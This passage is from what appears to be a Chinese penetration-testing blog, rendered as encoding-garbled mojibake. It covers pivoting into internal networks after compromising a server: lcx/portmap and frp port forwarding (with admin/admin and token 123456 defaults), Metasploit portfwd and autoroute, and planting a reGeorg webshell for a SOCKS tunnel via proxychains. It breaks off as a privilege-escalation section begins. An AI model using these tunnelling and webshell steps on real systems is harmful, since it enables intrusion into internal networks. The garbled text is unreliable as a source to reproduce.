‡æœºå™¨ä¸Šåšè·³æ¿ï¼Œè¿›è€Œå¯ä»¥å¯¹å†…ç½‘è¿›è¡Œæ”»å‡»</p></blockquote></blockquote><ul><li>å››ç§åŸºæœ¬çš„ç½‘ç»œæƒ…å†µ</li><li><ul><li>æ”»å‡»è€…æœ‰ç‹¬ç«‹å¤–ç½‘IPï¼Œæ‹¿åˆ°shellçš„æœåŠ¡å™¨ä¹Ÿæœ‰ç‹¬ç«‹çš„å¤–ç½‘IP</li></ul></li><li><ul><li>æ”»å‡»è€…æœ‰ç‹¬ç«‹å¤–ç½‘IPï¼Œæ‹¿åˆ°shellçš„æœåŠ¡å™¨åœ¨å†…ç½‘ï¼Œåªæœ‰å‡ ä¸ªæ˜ å°„ç«¯å£</li></ul></li><li><ul><li>æ”»å‡»è€…åœ¨å†…ç½‘ï¼ŒæœåŠ¡å™¨ä¹Ÿåœ¨å†…ç½‘åªæœ‰å‡ ä¸ªæ˜ å°„ç«¯å£</li></ul></li><li><ul><li>æ”»å‡»è€…åœ¨å†…ç½‘ï¼ŒæœåŠ¡å™¨æœ‰ç‹¬ç«‹å¤–ç½‘IP</li></ul></li></ul><p>å››ç§æƒ…å†µæœ‰ä¸åŒæ‹¿ä¸‹æœåŠ¡å™¨çš„æ–¹å¼</p><h2 id="ç«¯å£è½¬å‘"><a href="#ç«¯å£è½¬å‘" class="headerlink" title="ç«¯å£è½¬å‘"></a>ç«¯å£è½¬å‘</h2><ul><li>åŸç†<br>ç«¯å£è½¬å‘æ˜¯è½¬å‘ä¸€ä¸ª<strong>ç½‘ç»œç«¯å£</strong>ä»<strong>ä¸€ä¸ªç½‘ç»œèŠ‚ç‚¹åˆ°å¦ä¸€ä¸ªç½‘ç»œèŠ‚ç‚¹</strong>çš„è¡Œä¸ºã€‚ä½¿ä¸€ä¸ªå¤–éƒ¨ç”¨æˆ·ä»å¤–éƒ¨ç»è¿‡ä¸€ä¸ªè¢«æ¿€æ´»çš„NATè·¯ç”±å™¨åˆ°è¾¾ä¸€ä¸ªåœ¨ç§æœ‰å†…éƒ¨IPåœ°å€(å±€åŸŸç½‘å†…éƒ¨ï¼‰ä¸Šçš„ä¸€ä¸ªç«¯å£ã€‚<br>ç®€å•åœ°è¯´ï¸°ç«¯å£è½¬å‘å°±æ˜¯å°†ä¸€ä¸ªç«¯å£ï¼ˆè¿™ä¸ªç«¯å£å¯ä»¥æœ¬æœºçš„ç«¯å£ï¼Œä¹Ÿå¯ä»¥æ˜¯æœ¬æœºå¯ä»¥è®¿é—®åˆ°çš„ä»»æ„ä¸»æœºçš„ç«¯å£ï¼‰è½¬å‘åˆ°<strong>ä»»æ„ä¸€å°å¯ä»¥è®¿é—®åˆ°çš„IP</strong>ä¸Šï¼Œé€šå¸¸è¿™ä¸ªIPæ˜¯å…¬ç½‘ip</li><li>ç«¯å£è½¬å‘åœºæ™¯âˆ¶<br>å¤–ç½‘ä¸»æœºAå·²ç»å¯ä»¥ä»»æ„è¿æ¥å†…ç½‘ä¸»æœºBä¸Šçš„ç«¯å£ï¼Œä½†æ˜¯æ— æ³•è®¿é—®å†…ç½‘ä¸»æœºCä¸Šçš„ç«¯å£<br>æ­¤æ—¶å¯ä»¥å°†Cä¸»æœºçš„ç«¯å£è½¬å‘åˆ°Bä¸»æœºçš„ç«¯å£ï¼Œé‚£ä¹ˆå¤–ç½‘ä¸»æœºAè®¿é—®Bä¸»æœºçš„æŸæŸç«¯å£å°±ç›¸å½“äºè®¿é—®äº†Cä¸»æœºçš„æŸæŸç«¯å£<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/d6a37fdf-34be-4c25-8d13-9c30d6f6b7fc.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/d6a37fdf-34be-4c25-8d13-9c30d6f6b7fc.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></li></ul><h3 id="ç«¯å£è½¬å‘å·¥å…·"><a href="#ç«¯å£è½¬å‘å·¥å…·" class="headerlink" title="ç«¯å£è½¬å‘å·¥å…·"></a>ç«¯å£è½¬å‘å·¥å…·</h3><h4 id="lcx"><a href="#lcx" class="headerlink" title="lcx"></a>lcx</h4><blockquote><p>lcxæ˜¯ä¸€ä¸ªå±…äºsocketå¥—æ¥å­—å®ç°çš„ç«¯å£è½¬å‘å·¥å…·ï¼Œæœ‰windowså’Œlinuxä¸¤ä¸ªç‰ˆæœ¬ï¼Œwindowså«lcx.exe,linuxå«portmap<br>ä¸€ä¸ªæ­£å¸¸çš„socketéš§é“å¿…é¡»å…·å¤‡ä¸¤ç«¯ï¼šæœåŠ¡å™¨ç«¯å’Œå®¢æˆ·ç«¯</p></blockquote><h5 id="windowsä¸‹ï¼š"><a href="#windowsä¸‹ï¼š" class="headerlink" title="windowsä¸‹ï¼š"></a>windowsä¸‹ï¼š</h5><blockquote><ul><li>è½¬å‘ç«¯å£ï¼š<code>lcx.exe -slave å…¬ç½‘IP ç«¯å£ å†…ç½‘IP ç«¯å£</code></li><li>ç›‘å¬ç«¯å£ï¼š<code>lcx.exe -listen è½¬å‘ç«¯å£ï¼Œæœ¬æœºä»»æ„æ²¡æœ‰æ²¡æœ‰è¢«å ç”¨çš„ç«¯å£</code></li><li>æ˜ å°„ç«¯å£ï¼š<code>lcx.exe -tran æ˜ å°„ç«¯å£å· ip ç›®æ ‡ç«¯å£</code></li></ul></blockquote><ul><li><p>æœ¬åœ°ç«¯å£æ˜ å°„:å¦‚æœç›®æ ‡æœåŠ¡å™¨ç”±äºé˜²ç«å¢™çš„é™åˆ¶ï¼Œéƒ¨åˆ†ç«¯å£çš„æ•°æ®æ— æ³•é€šè¿‡é˜²ç«å¢™ï¼Œå¯ä»¥å°†ç›®æ ‡æœåŠ¡å™¨ç›¸åº”ç«¯å£çš„æ•°æ®ä¼ åˆ°<strong>é˜²ç«å¢™å…è®¸çš„å…¶ä»–ç«¯å£</strong><br><code>lcx.exe -tran æ˜ å°„ç«¯å£å· ç›®æ ‡ip ç›®æ ‡ç«¯å£</code></p></li><li><p>å†…ç½‘ç«¯å£è½¬å‘ï¼šå¦‚ä¸‹è§„åˆ™æ—¶ï¼Œä¸»æœºä¸èƒ½ç›´æ¥è®¿é—®å†…ç½‘ï¼Œè¿™æ—¶å°±éœ€è¦webæœåŠ¡å™¨å½“<strong>è·³æ¿</strong>ï¼Œä¹Ÿå°±æ˜¯<strong>ä»£ç†</strong>æ¥ä½¿æ”»å‡»æœºè®¿é—®åˆ°å†…ç½‘ä¸»æœº<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/210124f1-baf9-436a-93c8-f7fd2ef87421.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/210124f1-baf9-436a-93c8-f7fd2ef87421.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"><br>åŸºæœ¬å‘½ä»¤ï¼š<br>Â·è½¬å‘ç«¯å£<code>lcx.exe -slave å…¬ç½‘ip ç«¯å£ å†…ç½‘ip ç«¯å£</code><br>Â·ç›‘å¬ç«¯å£<code>lcx.exe -listen è½¬å‘ç«¯å£ æœ¬æœºä»»æ„æ²¡æœ‰è¢«å ç”¨ç«¯å£</code></p></li></ul><blockquote><p>windowsç«¯å£è½¬å‘å®ä¾‹<br>ç¯å¢ƒï¸°å†…ç½‘ä¸»æœºä¸èƒ½è®¿é—®å¤–ç½‘ï¼Œä½†æ˜¯å¯ä»¥è®¿é—®åŒç½‘æ®µçš„å†…ç½‘æœºå™¨ï¼ŒåŒæ—¶80ç«¯å£åªèƒ½æœ¬åœ°è®¿é—®ï¼Œä½†æ˜¯8080ç«¯å£å¯¹å¤–å¼€æ”¾ã€‚</p><blockquote><p>æ­¥éª¤ä¸€:è¢«æ§æœåŠ¡å™¨çš„80ç«¯å£è½¬å‘åˆ°æœ¬åœ°çš„8080ç«¯å£ <code>lcx -tran 8080 127.0.0.1 80</code><br>æ­¥éª¤äºŒâˆ¶åœ¨å†…ç½‘è¢«æ§æœåŠ¡å™¨ä¸Šè¿æ¥å†…ç½‘èƒ½å¤Ÿå¯¹å¤–è®¿é—®çš„æœåŠ¡å™¨ <code>lcx -slave 192.168.56.1 4444 192.168.56.101 8080</code><br>æ­¥éª¤ä¸‰âˆ¶åœ¨èƒ½å¤Ÿå¯¹å¤–è®¿é—®çš„å†…ç½‘æœºå™¨ä¸Šç›‘å¬ç«¯å£ <code>lcx -listen 4444 12345</code><br>æ­¥éª¤å››âˆ¶å¤–ç½‘æœºå™¨è®¿é—®192.168.56.1çš„12345ç«¯å£ä¹Ÿå°±æ˜¯ä»<strong>æœåŠ¡å™¨12345-&gt;æœåŠ¡å™¨4444-&gt;å¤–ç½‘8080-&gt;å†…ç½‘80</strong><br>åœ¨å¤–ç½‘192.168.64.230è®¿é—®192.168.64.103:12345</p></blockquote></blockquote><h5 id="linuxä¸‹ï¼š"><a href="#linuxä¸‹ï¼š" class="headerlink" title="linuxä¸‹ï¼š"></a>linuxä¸‹ï¼š</h5><p>ç”¨æ³•:<code>./portmap -m method [-h1 host1] -p1 port1 [-h2 host2] -p2 port2 [-v] [-log filename]</code><br>v:version</p><blockquote><p>-m:æŒ‡å®šmethod actionå‚æ•°<br>method&#x3D;1:ç›‘å¬port1è¿æ¥è‡³ä¸»æœº2çš„port2(ç«¯å£æ˜ å°„)<br>method&#x3D;2:ç›‘å¬Port1è½¬å‘è‡³port2<br>method&#x3D;3:è¿æ¥ä¸»æœº1å¯¹åº”çš„ç«¯å£å’Œä¸»æœº2å¯¹åº”çš„ç«¯å£(ç«¯å£è½¬å‘)</p></blockquote><p>å¦‚:<code>./portmap -m 2 -p1 6666 -h2 å…¬ç½‘ip -p2 7777</code>&#x2F;&#x2F;ç›‘å¬æ¥è‡ª6666ç«¯å£çš„è¯·æ±‚å¹¶è½¬å‘è‡³7777</p><h4 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h4><ul><li>FRP(fast reverse proxy)æ˜¯ç”¨goè¯­è¨€å¼€å‘çš„<strong>åå‘ä»£ç†åº”ç”¨</strong>ï¼Œå¯ä»¥è¿›è¡Œ<strong>å†…ç½‘ç©¿é€</strong></li><li>frpæ”¯æŒtcp\udp\http\https</li></ul><p>frpç”¨å¤„</p><blockquote><ol><li>åˆ©ç”¨å¤„äº<strong>å†…ç½‘</strong>æˆ–<strong>é˜²ç«å¢™</strong>çš„æœºå™¨ï¼Œå¯¹å¤–ç½‘æä¾›http\https\tcp\udpæœåŠ¡</li><li>å¯¹äºhttp,httpsæœåŠ¡æ”¯æŒåŸºäºåŸŸåçš„è™šæ‹Ÿä¸»æœºï¼Œæ”¯æŒè‡ªå®šä¹‰åŸŸåï¼Œæ˜¯å¤šä¸ªåŸŸåå…±ç”¨ä¸€ä¸ª80ç«¯å£</li></ol></blockquote><p>ä¸‹è½½åfrpæ–‡ä»¶å†…frps,frps.iniä¸ºæœåŠ¡ç«¯ç¨‹åºå’Œé…ç½®æ–‡ä»¶ï¼Œfrpc,frpc.iniæ˜¯å®¢æˆ·ç«¯ç¨‹åºåŠé…ç½®æ–‡ä»¶</p><blockquote><ul><li>æœåŠ¡ç«¯è®¾ç½®</li></ul><blockquote><p>ä¿®æ”¹frp.ini<br>æ–‡ä»¶æ ¼å¼ï¼š</p></blockquote><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;[common]</span><br><span class="line">&gt;&gt;bind_port = 7000 #frpæœåŠ¡å™¨ç›‘å¬ã°</span><br><span class="line">&gt;&gt;dashboard_port = 7500 #webåå°ç›‘å¬ç«¯å£</span><br><span class="line">&gt;&gt;dashboard_user =admin #webåå°ç”¨æˆ·ååŠå¯†ç </span><br><span class="line">&gt;&gt;dashboard_pwd = admin</span><br><span class="line">&gt;&gt;token = 123456 #å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨çš„è¿æ¥å£ä»¤</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>è¿è¡ŒfrpsæœåŠ¡å™¨ç«¯ <code>./frps -c frps.ini</code> #-cæ„æ€æ˜¯åŠ è½½é…ç½®æ–‡ä»¶<br>è®¿é—®x.x.x.x:7500ï¼Œä½¿ç”¨è‡ªå·±è®¾ç½®çš„ç”¨æˆ·åå’Œå¯†ç ç™»å½•</p></blockquote><ul><li>å®¢æˆ·ç«¯è®¾ç½®</li></ul><blockquote><p>ä¿®æ”¹frpc.iniæ–‡ä»¶</p></blockquote><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;[common]</span><br><span class="line">&gt;&gt;server_addr = 192.168.152.217</span><br><span class="line">&gt;&gt;#æœåŠ¡ç«¯IPåœ°å€</span><br><span class="line">&gt;&gt;server_port = 7000</span><br><span class="line">&gt;&gt;#æœåŠ¡å™¨ç«¯å£</span><br><span class="line">&gt;&gt;token = 123456</span><br><span class="line">&gt;&gt;#æœåŠ¡å™¨ä¸Šè®¾ç½®çš„è¿æ¥å£ä»¤</span><br><span class="line">&gt;&gt;[http]</span><br><span class="line">&gt;&gt;#è‡ªå®šä¹‰è§„åˆ™ï¼Œ[xxx]è¡¨ç¤ºè§„åˆ™å</span><br><span class="line">&gt;&gt;type = tcp</span><br><span class="line">&gt;&gt;#type:è½¬å‘çš„åè®®ç±»å‹</span><br><span class="line">&gt;&gt;local_ip = 127.0.0.1</span><br><span class="line">&gt;&gt;local_port = 3389</span><br><span class="line">&gt;&gt;#æœ¬åœ°åº”ç”¨çš„ç«¯å£å·</span><br><span class="line">&gt;&gt;remote_port = 7001</span><br><span class="line">&gt;&gt;#è¿™æ¡è§„åˆ™åœ¨æœåŠ¡ç«¯å¼€æ”¾çš„ç«¯å£å·</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>é…ç½®å®Œæˆfrp.iniåï¼Œcmdè¿è¡Œfrpc(å’ŒæœåŠ¡ç«¯ä¸€æ ·-cæŒ‡å®šé…ç½®æ–‡ä»¶)<br>åœ¨å±€åŸŸç½‘å¤–å®¢æˆ·ç«¯è¿æ¥æœåŠ¡ç«¯çš„remote_portç«¯å£</p></blockquote></blockquote><p>è¯¥å·¥å…·å¯è·¨å¹³å°ï¼Œä¹Ÿå°±æ˜¯windows exeç¨‹åºè¿æ¥linux<br>ä¸Šè¿°æ“ä½œä¹Ÿå°±<strong>ç›¸å½“äºlisten 7000è½¬åˆ°7001</strong>ç„¶åè¿æ¥</p><h4 id="metasploit-portfwd"><a href="#metasploit-portfwd" class="headerlink" title="metasploit portfwd"></a>metasploit portfwd</h4><ul><li>ç®€ä»‹<br>ä¸€æ¬¾å†…ç½®äºmeterpreter shellä¸­çš„å·¥å…·ï¼Œç›´æ¥è®¿é—®æ”»å‡»ç³»ç»Ÿæ— æ³•è®¿é—®çš„æœºå™¨ã€‚åœ¨å¯ä»¥è®¿é—®æ”»å‡»æœºå’Œé¶æœºçš„å—æŸä¸»æœºä¸Šè¿è¡Œæ­¤å‘½ä»¤ï¼Œå¯ä»¥é€šè¿‡æœ¬æœºè½¬å‘TCPè¿æ¥ï¼Œæˆä¸ºä¸€ä¸ªæ”¯ç‚¹ã€‚</li></ul><blockquote><p>é€‰é¡¹<br>-Lâˆ¶è¦ç›‘å¬çš„æœ¬åœ°ä¸»æœº(å¯é€‰).<br>-l : è¦ç›‘å¬çš„æœ¬åœ°ç«¯å£ï¼Œä¸æ­¤ç«¯å£çš„è¿æ¥å°†è¢«è½¬å‘åˆ°è¿œç¨‹ç³»ç»ŸÂ·<br>-pâˆ¶è¦è¿æ¥çš„è¿œç¨‹ç«¯å£ï¼ŒTCPè¿æ¥å°†è½¬å‘åˆ°çš„ç«¯å£<br>-râˆ¶è¦è¿æ¥çš„è¿œç¨‹ä¸»æœºçš„IPåœ°å€<br>å‚æ•°<br>Add :è¯¥å‚æ•°ç”¨äº<strong>åˆ›å»º</strong>è½¬å‘<br><code>portfwd add -I æœ¬åœ°ç›‘å¬ç«¯å£å· -p ç›®æ ‡ç«¯å£å· -r ç›®æ ‡æœºIPåœ°å€</code><br>Delete :è¿™å°†ä»è½¬å‘ç«¯å£åˆ—è¡¨ä¸­åˆ é™¤<strong>å…ˆå‰çš„</strong>æ¡ç›®.<br><code>portfwd delete -I æœ¬åœ°ç›‘å¬ç«¯å£å· -p ç›®æ ‡ç«¯å£å· -r ç›®æ ‡æœºIPåœ°å€</code><br>List :<strong>åˆ—å‡º</strong>å½“å‰è½¬å‘çš„æ‰€æœ‰ç«¯å£<br><code>portfwd list</code><br>Flush :è¿™å°†åˆ é™¤è½¬å‘åˆ—è¡¨ä¸­çš„<strong>æ‰€æœ‰</strong>ç«¯å£</p></blockquote><p>è¿™ä¸ªä¸å¤ªç¨³å®šï¼Œä¸å¦‚frpï¼Œlcxä¸æ€ä¹ˆç”¨äº†ã€‚</p><h1 id="è¾¹ç•Œä»£ç†"><a href="#è¾¹ç•Œä»£ç†" class="headerlink" title="è¾¹ç•Œä»£ç†"></a>è¾¹ç•Œä»£ç†</h1><p>ä»£ç†ç±»åˆ«ï¼šHTTPä»£ç†ã€socksä»£ç†ã€telnetä»£ç†ã€sslä»£ç†<br>ä»£ç†å·¥å…·ï¼šEarthWormã€reGeorg(httpä»£ç†)ã€proxifier(win)ã€sockscap64(win)ã€proxychains(linux)</p><p>å†…ç½‘é€šè¿‡ä»£ç†è¿æ¥å¤–éƒ¨ç½‘ç»œä¸ºæ­£å‘ä»£ç†ï¼Œå¤–ç½‘é€šè¿‡ä»£ç†è¿æ¥å†…ç½‘ä¸ºåå‘ä»£ç†ã€‚<br>è´Ÿè½½å‡è¡¡æœåŠ¡å™¨ï¼šå°†ç”¨æˆ·çš„è¯·æ±‚åˆ†å‘åˆ°ç©ºé—²æœåŠ¡å™¨ä¸Šã€‚</p><ul><li><p>socksä»£ç†<br>å½“é€šè¿‡ä»£ç†æœåŠ¡å™¨è®¿é—®ä¸€ä¸ªç½‘ç«™æ—¶ï¼ŒsocksæœåŠ¡å™¨èµ·åˆ°äº†ä¸€ä¸ªä¸­é—´äººçš„èº«ä»½ï¼Œåˆ†åˆ«ä¸ä¸¤æ–¹é€šä¿¡ç„¶åå°†ç»“æœå‘ŠçŸ¥å¦ä¸€æ–¹ã€‚åªè¦é…ç½®å¥½socksä»£ç†åæ— éœ€æŒ‡å®š<strong>è¢«è®¿é—®ç›®æ ‡</strong>ã€‚<br>sockså’Œhttpä»£ç†èµ°çš„æ˜¯tcpæµé‡ï¼Œæ„æ€æ˜¯udpçš„åè®®ä¸èƒ½ç”¨è¿™ä¸¤ç§ä»£ç†</p></li><li><p>ä»£ç†å’Œç«¯å£è½¬å‘çš„å¼‚åŒï¼š</p></li></ul><table><thead><tr><th>ä»£ç†</th><th>ç«¯å£è½¬å‘</th></tr></thead><tbody><tr><td>éœ€è¦socksåè®®æ”¯æŒ</td><td>æ— éœ€åè®®æ”¯æŒ</td></tr><tr><td>ä¸€å¯¹å¤šï¼Œè®¿é—®ç½‘ç»œ</td><td>ä¸€å¯¹ä¸€ï¼Œå¸®åŠ©ä»–äººè®¿é—®æŸç«¯å£</td></tr></tbody></table><p>socksä»£ç†å¯ä»¥ç†è§£ä¸ºlcxç«¯å£è½¬å‘ï¼Œä»–åœ¨æœåŠ¡ç«¯ç›‘å¬ä¸€ä¸ªæœåŠ¡ç«¯å£ï¼Œæœ‰è¿æ¥è¯·æ±‚æ—¶ä¼šä»socksåè®®ä¸­è§£æå‡ºè®¿é—®ç›®æ ‡urlçš„ç›®æ ‡ç«¯å£</p><p><strong>æ„æ€å°±æ˜¯ï¼Œæœ‰ä»£ç†å°±ä¸éœ€è¦ä»–å¨˜çš„ç«¯å£è½¬å‘äº†ï¼Œè¿˜æŒ‡å®šç«¯å£è½¬æ¥è½¬å»è„‘å­éƒ½è½¬æ™•äº†ï¼Œä»£ç†ä¸éœ€è¦é‚£ä¹ˆå¤šèŠ±é‡Œèƒ¡å“¨çš„ã€‚</strong></p><h2 id="proxychains"><a href="#proxychains" class="headerlink" title="proxychains"></a><strong>proxychains</strong></h2><ul><li>proxychainsæ˜¯ä¸€ä¸ªå¼€æºä»£ç†å·¥å…·ï¼Œå¯ä»¥åœ¨linuxä¸‹å…¨å±€ä»£ç†ã€‚proxychainsé€šè¿‡ä¸€ä¸ªç”¨æˆ·å®šä¹‰çš„ä»£ç†åˆ—è¡¨å¼ºåˆ¶è¿æ¥æŒ‡å®šçš„åº”ç”¨ç¨‹åºï¼Œæ”¯æŒhttp\socks4\socks5ç±»å‹ã€‚</li><li>ä½¿ç”¨</li></ul><blockquote><ol><li>åœ¨ä½¿ç”¨å·¥å…·å‰è¦å¯¹å·¥å…·è¿›è¡Œé…ç½®ï¼Œé…ç½®æ–‡ä»¶:&#x2F;etc&#x2F;proxychains.conf<br>åˆ é™¤dynamic_chainçš„æ³¨é‡Š<br>åº•éƒ¨æ·»åŠ ä»£ç†æœåŠ¡å™¨<br><code>proxychains è½¯ä»¶å</code>ä»¥ä»£ç†å¯åŠ¨ä»»æ„è½¯ä»¶</li></ol></blockquote><h2 id="regeorgå·¥å…·"><a href="#regeorgå·¥å…·" class="headerlink" title="regeorgå·¥å…·"></a>regeorgå·¥å…·</h2><ul><li>regeorgä¸»è¦æ˜¯æŠŠå†…ç½‘æœåŠ¡å™¨ç«¯å£é€šè¿‡http&#x2F;httpséš§é“è½¬å‘è‡³æœ¬æœºï¼Œå½¢æˆå›è·¯</li><li>ç”¨äºç›®æ ‡æœåŠ¡å™¨åœ¨<strong>å†…ç½‘æˆ–åšäº†ç«¯å£ç­–ç•¥</strong>çš„æƒ…å†µä¸‹è¿æ¥ç›®æ ‡æœåŠ¡å™¨å†…éƒ¨å¼€æ”¾ç«¯å£</li><li>åˆ©ç”¨webshellå»ºç«‹ä¸€ä¸ªsocksä»£ç†è¿›è¡Œå†…ç½‘ç©¿é€ï¼Œåˆ™æœåŠ¡å™¨å¿…é¡»æ”¯æŒaspx\php\jspä¸­çš„ä¸€ç§</li><li>regeorgåˆ†ä¸ºæœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ã€‚<strong>æœåŠ¡ç«¯æœ‰php\aspx\jsp\node.jsç­‰å¤šç§ï¼Œå®¢æˆ·ç«¯ä¸ºpython</strong>ï¼Œæ‰€ä»¥ç”¨çš„æ—¶å€™æ–‡ä»¶é‡Œé¢æ‰¾å¯¹åº”è„šæœ¬</li></ul><h3 id="regeorgä½¿ç”¨"><a href="#regeorgä½¿ç”¨" class="headerlink" title="regeorgä½¿ç”¨"></a>regeorgä½¿ç”¨</h3><p>å’Œproxychainsç»“åˆä½¿ç”¨</p><ol><li><p>pip installå®‰è£…</p></li><li><p>å‡è®¾æœåŠ¡å™¨æ˜¯phpç‰ˆæœ¬ï¼Œå°†regeorgé‡Œçš„phpä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œç›´æ¥è®¿é—®æ˜¾ç¤ºâ€georg says,â€™all seems fineâ€™â€ï¼Œä¸ºæ­£å¸¸è¿è¡Œ<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/1937af61-ef7b-46ef-9a2b-2c44da3cc586.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/1937af61-ef7b-46ef-9a2b-2c44da3cc586.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p></li><li><p>ç»ˆç«¯ä¸‹è¿è¡Œ:<code>python reGeorgSocksProxy.py -u é¶æœºreGeorgè„šæœ¬åœ°å€ -p æœ¬åœ°ç›‘å¬ç«¯å£</code></p></li><li><p>å†èµ·ä¸€ä¸ªç»ˆç«¯ä¿®æ”¹proxychains.confé…ç½®æ–‡ä»¶ï¼Œåˆ é™¤dynamic_chainçš„æ³¨é‡Šï¼Œåœ¨ProxyListæœ€ååŠ ä¸€è¡Œ<code>socks5 127.0.0.1 æœ¬åœ°ç›‘å¬ç«¯å£</code>ï¼Œå¹¶æŠŠå…¶ä»–çš„æ³¨é‡Š<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/86acdd55-5931-45f2-a10b-7c09d7eb41d5.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/86acdd55-5931-45f2-a10b-7c09d7eb41d5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä»£ç†å°±é…ç½®å¥½äº†</p></li><li><p>ä½¿ç”¨<code>proxychains å‘½ä»¤</code>ï¼Œæµé‡ä¼šè‡ªåŠ¨ä»é…ç½®æ–‡ä»¶ç«¯å£ç»è¿‡(pythonè·‘çš„è„šæœ¬ç»ˆç«¯åˆ«å…³)</p></li></ol><p>ä½†æ˜¯åœ¨msfå¤–é…ç½®çš„ä»£ç†,msfå†…éƒ¨æµé‡æ˜¯ä¸ä¼šèµ°ä»£ç†è¿‡çš„</p><h2 id="msf-route"><a href="#msf-route" class="headerlink" title="msf route"></a>msf route</h2><p>msfæ¡†æ¶ä¸­è‡ªå¸¦è·¯ç”±è½¬å‘åŠŸèƒ½ï¼Œåœ¨å·²ç»è·å–meterpreter shellçš„åŸºç¡€ä¸Šæ·»åŠ ä¸€æ¡å»å¾€å†…ç½‘çš„è·¯ç”±<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/67351477-e0eb-4cf7-a460-01505220b4f7.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/67351477-e0eb-4cf7-a460-01505220b4f7.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"><br>è·¯ç”±æ·»åŠ ï¼š <code>run autoroute -s å†…ç½‘ç½‘ç«¯</code><br><code>run autoroute -p</code> æŸ¥çœ‹è·¯ç”±æ·»åŠ æƒ…å†µ</p><h2 id="proxifiler"><a href="#proxifiler" class="headerlink" title="proxifiler"></a>proxifiler</h2><p>proxifilerä¸ºwindowså®¢æˆ·ç«¯ä»£ç†å·¥å…·ï¼Œ<strong>socks5å®¢æˆ·ç«¯</strong>ï¼Œå¯ä»¥è®©ä¸æ”¯æŒé€šè¿‡ä»£ç†æœåŠ¡å™¨å·¥ä½œçš„ç¨‹åºé€šè¿‡httpsæˆ–socks5ä»£ç†æˆ–ä»£ç†é“¾</p><ul><li>æ”¯æŒsocks4\socks5\http\tcp\udpã€‚æœ‰gui<br>ä½¿ç”¨:profilé…ç½®ä»£ç†ipå’Œç«¯å£ã€‚proxification rulesè®¾ç½®ä»£ç†è§„åˆ™ï¼Œä¸éœ€è¦ä»£ç†çš„è®¾ä¸ºdirectæ¨¡å¼</li></ul><p>ï¼ˆä½†æ˜¯ä¸ªäººåœ¨ç”¨shadowsocksâ€¦dddd)</p><p>ï»¿ææƒå¯ä»¥æœ‰å¥½å‡ ç§ï¼Œæœ¬ç¯‡ä¸»è¦è®²åˆ©ç”¨ç³»ç»Ÿæ¼æ´ææƒ(æœ€å¸¸è§„)å’Œåˆ©ç”¨æ•°æ®åº“ææƒã€‚æ•°æ®åº“è¿™ç§åˆ©ç”¨ç¬¬ä¸‰æ–¹ææƒçš„æ–¹å¼é€šå¸¸æ¯”è¾ƒå°‘è§</p><h1 id="windowsæƒé™æå‡"><a href="#windowsæƒé™æå‡" class="headerlink" title="windowsæƒé™æå‡"></a>windowsæƒé™æå‡</h1><p>å½“æˆ‘ä»¬getshellä¸€ä¸ªç½‘ç«™åï¼Œå¤§éƒ¨åˆ†æƒ…å†µä¸‹æˆ‘ä»¬çš„æƒé™æ˜¯éå¸¸ä½çš„ï¼Œè¿™ä¸ªæ—¶å€™ææƒå¯ä»¥è®©æˆ‘ä»¬å¦‚æ‹¥æœ‰ä¿®æ”¹æ–‡ä»¶ä¹‹ç±»çš„å¼ºå¤§èƒ½åŠ›ã€‚</p><p>ä¸€èˆ¬æ¥è¯´ï¼Œææƒé€šå¸¸æ˜¯æ”¹å˜ç”¨æˆ·</p><blockquote><p>windows: user -&gt; system  user-&gt;administrator<br>linux: user-&gt;root</p></blockquote><ul><li>ææƒçš„æ–¹å¼é€šå¸¸æœ‰ï¼š</li></ul><ol><li>ç³»ç»Ÿæ¼æ´ææƒ</li><li>æ•°æ®åº“ææƒ</li><li>ç¬¬ä¸‰æ–¹è½¯ä»¶&#x2F;æœåŠ¡ææƒ</li><li>ç³»ç»Ÿé…ç½®é”™è¯¯ææƒ</li></ol><p>å¦‚æœç›®çš„æ˜¯downloadæœåŠ¡å™¨æ–‡ä»¶æˆ–è€…æ‹¿ä¸‹webshellç­‰æ²¡å¿…è¦ææƒï¼Œå¦‚æœæ˜¯ä¸ºäº†åšè‚‰é¸¡æˆ–è€…ä¸Šè¿œæ§</p><h2 id="ç³»ç»Ÿæ¼æ´ææƒ"><a href="#ç³»ç»Ÿæ¼æ´ææƒ" class="headerlink" title="ç³»ç»Ÿæ¼æ´ææƒ"></a>ç³»ç»Ÿæ¼æ´ææƒ</h2><p>å¸¸è§„æµç¨‹ï¼š<strong>è·å¾—ç›®æ ‡æœºshell-&gt;æŸ¥çœ‹ç›®æ 